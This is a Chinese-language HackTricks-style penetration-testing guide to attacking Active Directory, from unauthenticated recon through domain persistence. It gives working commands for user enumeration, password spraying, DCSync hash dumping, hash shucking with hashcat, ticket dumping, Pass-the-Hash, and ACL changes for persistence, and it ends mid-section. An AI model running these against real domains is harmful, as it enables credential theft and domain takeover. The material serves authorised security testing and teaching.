# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使 **网络管理员** 能够高效地在网络内创建和管理 **domains**、**users** 和 **objects**。它被设计为可扩展，便于将大量用户组织成可管理的 **groups** 和 **subgroups**，并在不同层级控制 **access rights**。

**Active Directory** 的结构由三个主要层次组成：**domains**、**trees** 和 **forests**。一个 **domain** 包含一组对象，例如 **users** 或 **devices**，共享一个公共数据库。**Trees** 是由共享结构连接的这些 domains 的组，而 **forest** 则代表多个 trees 的集合，通过 **trust relationships** 相互连接，构成组织结构的最顶层。可以在每个层级上指定特定的 **access** 和 **communication rights**。

Active Directory 的关键概念包括：

1. **Directory** – 存放有关 Active Directory 对象的所有信息。
2. **Object** – 表示目录中的实体，包括 **users**、**groups** 或 **shared folders**。
3. **Domain** – 作为目录对象的容器，多个 domains 可以共存于一个 **forest** 中，每个 domain 拥有自己的对象集合。
4. **Tree** – 共享根域的 domains 分组。
5. **Forest** – Active Directory 中的组织结构顶层，由多个具有 **trust relationships** 的 trees 组成。

**Active Directory Domain Services (AD DS)** 包含一系列对集中管理和网络内通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中数据存储并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 管理安全 **digital certificates** 的生成、分发和生命周期。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持目录启用的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 功能，在一次会话中对多个 web 应用进行身份验证。
5. **Rights Management** – 帮助保护版权材料，限制其未经授权的分发和使用。
6. **DNS Service** – 对于 **domain names** 的解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要了解如何 **attack an AD**，需要非常熟悉 **Kerberos** 身份验证过程。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

你可以访问 https://wadcoms.github.io/ 来快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你可以访问 AD 环境但没有任何凭据/会话，你可以：

- **Pentest the network:**
- 扫描网络，查找主机和开放端口，尝试 **exploit vulnerabilities** 或从中 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供有关域内关键服务器的信息，例如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取有关如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上不起作用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 关于如何枚举 SMB 服务器的更详细指南可以在此找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 关于如何枚举 LDAP 的更详细指南可以在此找到（请**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从内部文档、社交媒体、域内服务（主要是 web）以及公开可用资源中提取用户名/姓名。
- 如果你找到公司员工的完整姓名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名约定包括：_NameSurname_、_Name.Surname_、_NamSur_（各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个随机字母加 3 个随机数字（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求的用户名无效时，服务器将使用 Kerberos 错误代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 进行响应，从而让我们确定该用户名无效。**有效的用户名** 将在 AS-REP 响应中返回 TGT，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行预认证。
- **No Authentication against MS-NRPC**: 在域控制器上对 MS-NRPC (Netlogon) 接口使用 auth-level = 1（无认证）。该方法在绑定 MS-NRPC 接口后调用 DsrGetDcNameEx2 函数，以在没有任何凭据的情况下检查用户或计算机是否存在。工具 NauthNRPC 实现了这一类型的枚举。相关研究可在此找到：
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现这些服务器之一，你还可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 和 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 找到用户名列表。
>
> 但是，你应该已经从之前应执行的 recon 步骤中获取到**在公司工作的人员姓名**。有了名和姓，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### Knowing one or several usernames

好的，假设你已经知道一个有效的用户名但没有密码……那么尝试：

- [**ASREPRoast**](asreproast.md): 如果某个用户**没有**属性 _DONT_REQ_PREAUTH_，你可以为该用户**请求 AS_REP 消息**，其中会包含一些由该用户密码派生并加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个发现的用户尝试最常见的密码，可能有人在使用弱密码（注意密码策略！）。
- 注意，你也可以 **spray OWA servers** 来尝试访问用户的邮件服务器。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够 **obtain** 一些可用于破解的挑战 **hashes**，通过对网络的某些协议进行 **poisoning**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经枚举了 active directory，你会得到**更多邮箱地址并对网络有更好的理解**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD env 的访问。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 在每次 engagement 中保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为每个协议生成 SQLite DB（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换视图，用 `creds` 列出收集到的秘密。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 快速发现子网，会显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的成员是 **relay-prone**，而 DC 通常要求签名。
- 从 NetExec 输出直接生成 **/etc/hosts** 中的主机名以便目标定位：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** 因为 signing 时，仍要探查 **LDAP** 的配置：`netexec ldap <dc>` 会显示 `(signing:None)` / weak channel binding。要求 SMB signing 但禁用 LDAP signing 的 DC 仍然可能成为可利用的 **relay-to-LDAP** 目标，可被用于像 **SPN-less RBCD** 这样的滥用。

### 客户端打印机凭证 leaks → 批量域凭证验证

- 打印机/网页 UIs 有时会在 **HTML 中嵌入被掩码的管理员密码**。查看 source/devtools 可能暴露明文（例如 `<input value="<password>">`），从而允许通过 Basic-auth 访问扫描/打印 存储库。
- 检索到的打印任务可能包含带有每用户密码的 **明文入职文档**。测试时保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

如果你能以 **null 或 guest 用户** 访问其他 PC 或共享，你可以 **放置文件**（例如 SCF 文件），当这些文件被访问时会触发对你的 NTLM 认证，从而可以 **窃取** **NTLM challenge** 以便破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已持有的每个 NT hash 视为其他较慢格式（其密钥材料直接由 NT hash 导出）的候选密码。与其对 Kerberos RC4 tickets、NetNTLM 挑战或 cached credentials 中的长口令进行暴力破解，不如将 NT hashes 输入 Hashcat 的 NT-candidate 模式，让它验证密码重用而无需知道明文。这在域妥协后尤为有效，你可以收集数千个当前和历史 NT hashes。

在以下情况使用 shucking：

- 你拥有来自 DCSync、SAM/SECURITY dumps 或 credential vaults 的 NT 语料，需要在其他域/林中测试重用。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明对长、不可破解口令的重用并立即通过 Pass-the-Hash (PtH) 进行横向移动。

该技术**不适用于**其密钥不是由 NT hash 导出的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制仅允许 AES，则必须回到常规密码模式。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 带历史记录抓取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目大幅扩大候选池，因为 Microsoft 每个账户最多可存储 24 个先前的 hash。有关更多采集 NTDS secrets 的方法，请参见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并将这些 hashes 附加到同一 `nt_candidates.txt` 列表。
- **Track metadata** – 保留生成每个 hash 的用户名/域（即使字典只包含十六进制）。一旦 Hashcat 输出匹配的候选项，匹配的 hash 立即告诉你哪个主体在重用密码。
- 优先选择来自同一林或受信任林的候选项；这会最大化 shucking 时重合的概率。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate 输入**必须保持原始 32 字节十六进制 NT hash**。禁用规则引擎（不要使用 `-r`，不要使用混合模式），因为篡改会破坏候选密钥材料。
- 这些模式本身并不一定更快，但 NTLM 密钥空间（在 M3 Max 上约 30,000 MH/s）比 Kerberos RC4（约 300 MH/s）快约 100×。测试经过筛选的 NT 列表比在慢格式中遍历整个密码空间便宜得多。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是近期添加的。
- 目前没有针对 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes (19600/19700) 需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 从每个 NT 候选中导出 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配则确认该 service account 使用了你已知的某个 NT hash。

3. 立即通过 PtH 横向移动：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

你也可以在事后使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文（如有需要）。

#### Example – Cached credentials (mode 31600)

1. 从已攻陷的工作站转储缓存登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会返回已在你列表中存在的 NT hash，证明该缓存用户在重用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速的 NTLM 模式下离线暴力破解以恢复字符串。

相同工作流程适用于 NetNTLM 挑战-响应（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配项，你可以启动 relay、SMB/WMI/WinRM PtH，或使用掩码/规则离线重新破解 NT hash。



## Enumerating Active Directory WITH credentials/session

在此阶段，你需要**已攻陷某个有效域账户的凭据或会话**。如果你拥有某些有效凭据或以域用户身份获得了 shell，**请记住之前提到的那些选项仍然可用于继续攻陷其他用户**。

在开始经过身份验证的枚举之前，你应该了解什么是 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

攻陷一个账户是开始攻陷整个域的**重要一步**，因为你将能够开始进行 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到所有可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以获取**所有用户名的列表**并尝试使用被攻陷账户的密码、空密码或其他有希望的新密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽
- 你也可以使用 [**powerview**](../basic-powershell-for-pentesters/powerview.md) 提取更详细的信息
- 另一个用于 Active Directory 侦察的优秀工具是 [**BloodHound**](bloodhound.md)。根据你使用的收集方法，它**可能不太隐蔽**，但如果你不在意这一点，强烈推荐尝试。查找用户能 RDP 的位置、查找到其他组的路径等。
- **其他自动化 AD 枚举工具包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS 记录**](ad-dns-records.md)，它们可能包含有趣的信息。
- 一个带 GUI 的工具可用于枚举目录的是来自 **SysInternal** 套件的 **AdExplorer.exe**。
- 你也可以用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_ 中的凭据，甚至在 _Description_ 字段中查找。参见 PayloadsAllTheThings 上关于 AD 用户注释中密码的部分（https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment）了解其他方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 很容易获取所有域用户名（`net user /domain`，`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使本节看起来简短，这也是最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound 的链接），学习如何枚举域并反复练习直到你感到熟练。在评估期间，这将是通向 DA 的关键时刻，或者让你判断无法继续的关键点。

### Kerberoast

Kerberoasting 涉及获取由与用户账户绑定的服务使用的 **TGS tickets**，并离线破解其基于用户密码的加密。

更多内容请见：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

一旦获得了一些凭据，你可以检查是否能够访问任何 **机器**。为此，你可以使用 **CrackMapExec** 根据端口扫描在多个服务器上尝试不同协议的连接。

### Local Privilege Escalation

如果你以常规域用户的身份获得了凭据或会话，并且该用户对域内的任何机器具有**访问权限**，你应该尝试在本地提权并搜集凭据。这是因为只有在具有本地管理员权限时，你才能**转储其他用户的哈希**（内存中的 LSASS 和本地的 SAM）。

本书中有完整的页面介绍 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html) 和一份 [**检查清单**](../checklist-windows-privilege-escalation.md)。另外，不要忘记使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

在当前用户中找到能让你访问意外资源的 **tickets** 的可能性非常**低**，但你仍然可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 Active Directory，你会获得**更多的邮件并更好地理解网络**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**。**

### Looks for Creds in Computer Shares | SMB Shares

既然你已有一些基本 credentials，你应检查是否能**找到**任何**在 AD 内被共享的有趣文件**。你可以手动执行，但这是一个非常无聊且重复的任务（如果发现数百个文档需要检查则更甚）。

[**点击此链接了解可用工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你可以**访问其他 PCs 或 shares**，你可以**放置文件**（例如 SCF 文件），如果这些文件被某种方式访问将**触发针对你的 NTLM authentication**，从而你可以**窃取**该 **NTLM challenge** 以进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何 authenticated user **compromise the domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**对于下面的技术，普通 domain user 不足以执行，你需要一些特殊的权限/凭证来实施这些攻击。**

### Hash extraction

希望你已设法使用 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md）、[escalating privileges locally](../windows-local-privilege-escalation/index.html) 等方法，成功 compromise 一些 local admin 账户。\
接着，是时候 dump 内存和本地的所有 hashes。\
[**阅读此页以了解获取 hashes 的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你拥有某用户的 hash**，你就可以用它来**impersonate**该用户。\
你需要使用某个 **tool** 来使用该 **hash** 执行 **NTLM authentication**，**或者**你可以创建一个新的 **sessionlogon** 并将该 **hash** 注入到 **LSASS** 中，这样当任何 **NTLM authentication** 被执行时，就会使用该 **hash**。最后一种方式是 mimikatz 所做的。\
[**阅读此页以获取更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为常见通过 NTLM 的 Pass The Hash 的替代方案。因此，在 NTLM 协议被禁用且仅允许 Kerberos 作为认证协议的网络中，这尤其有用。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**窃取用户的 authentication ticket**，而不是其密码或 hash 值。随后使用该被窃取的 ticket 来**impersonate the user**，在网络内获得对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个 **local administrator** 的 **hash** 或 **password**，你应尝试使用它在其他 **PCs** 上 **login locally**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意这会产生大量**噪声**，并且**LAPS**可以**缓解**。

### MSSQL 滥用与受信任链接

如果某个用户有权限**访问 MSSQL 实例**，他可能利用它在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **hash** 或甚至执行 **relay** **attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例信任（database link），并且该用户在被信任的数据库上有权限，那么他将能够**利用信任关系在另一个实例上也执行查询**。这些信任可以被串联，最终用户可能找到一个错误配置的数据库，在那里可以执行命令。\
**数据库之间的链接甚至跨 forest trusts 生效。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署 平台 滥用

第三方的 inventory 和 deployment 套件经常暴露获取凭据和代码执行的强大途径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 并且你在该计算机上拥有域权限，你将能够从所有登录到该计算机的用户的内存中转储 TGT。\
因此，如果一个 **Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以**自动攻陷一个 Print Server**（希望那会是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许进行 "Constrained Delegation"，它将能够**以任何用户的身份来访问该计算机上的某些服务**。\
然后，如果你**妥协了该用户/计算机的 hash**，你将能够**以任何用户的身份（即使是 domain admins）来访问这些服务**。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限可以使得以**提升的权限**获得代码执行成为可能：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 权限/ACL 滥用

被攻陷的用户可能在某些域对象上具有一些**有趣的权限**，这可能允许你后续进行横向移动/**权限提升**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 服务滥用

在域内发现 **Spool 服务正在监听** 可以被**滥用**以**获取新凭据**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话滥用

如果**其他用户**访问**被攻陷的**机器，就有可能**从内存中收集凭据**，甚至**向他们的进程注入 beacons**以冒充他们。\
通常用户会通过 RDP 访问系统，下面是如何对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一种管理域加入计算机上的**本地 Administrator 密码**的系统，确保其被**随机化**、唯一并且经常**更改**。这些密码存储在 Active Directory 中，访问由 ACL 控制，仅允许授权用户访问。拥有足够权限读取这些密码后，就可以实现对其他计算机的 pivot。


{{#ref}}
laps.md
{{#endref}}

### 证书窃取

**从被攻陷的机器收集证书**可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 证书模板滥用

如果配置了**易受攻击的模板**，可能可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

## 使用高权限账户的后渗透

### 转储域凭据

一旦你获得 **Domain Admin** 或更高的 **Enterprise Admin** 权限，你可以**转储**域数据库：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### 将权限提升作为持久化手段

之前讨论的一些技术可以被用作持久化手段。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 **PC 帐户的 hash**）为特定服务创建一个**合法的 Ticket Granting Service (TGS) ticket**，以此来**访问该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt 帐户的 NTLM hash**。该帐户很特殊，因为它用于签署所有的 **Ticket Granting Tickets (TGTs)**，这些票证对于在 AD 网络内进行认证至关重要。

一旦攻击者获得该 hash，他们就可以为任意帐户创建 **TGTs**（即 Silver ticket 攻击的基础）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这些类似于 golden tickets，但以能够**绕过常见的 golden tickets 检测机制**的方式伪造。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **基于证书的帐户持久化**

**拥有某个帐户的证书或能够请求它们**是保持该用户帐户持久性的非常有效方式（即使其更改密码也能继续生效）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **基于证书的域内持久化**

**使用证书也可以在域内以高权限进行持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder 组

Active Directory 中的 **AdminSDHolder** 对象通过对这些特权组（如 Domain Admins 和 Enterprise Admins）应用标准的 **Access Control List (ACL)** 来确保它们的安全，从而防止未授权更改。然而，这一特性也可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL，将完全访问权限授予普通用户，那么该用户将获得对所有特权组的广泛控制。这个旨在保护的安全机制因此可能适得其反，除非受到严格监控，否则会允许未授权的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM 凭据

在每台 **Domain Controller (DC)** 上都存在一个**本地管理员**帐户。通过在这样的机器上获得管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。随后需要修改注册表以**启用使用该密码**，从而允许远程访问本地 Administrator 帐户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL 持久化

你可以**赋予**某个**用户**对某些特定域对象的**特殊权限**，这将允许该用户在将来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 安全描述符

**安全描述符**用于**存储**对象在某个对象上所拥有的**权限**。如果你能够在对象的安全描述符中进行**一丁点的修改**，你就可以在不成为特权组成员的情况下获得对该对象的非常有意思的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### 动态对象 反取证 / 避免检测

滥用 `dynamicObject` 辅助类以使用 `entryTTL`/`msDS-Entry-Time-To-Die` 创建短寿命的主体/GPO/DNS 记录；它们会在没有 tombstones 的情况下自我删除，抹去 LDAP 证据，同时留下孤立的 SIDs、断裂的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意的 `gPCFileSysPath`/AD 集成 DNS 重定向）。

{{#ref}}
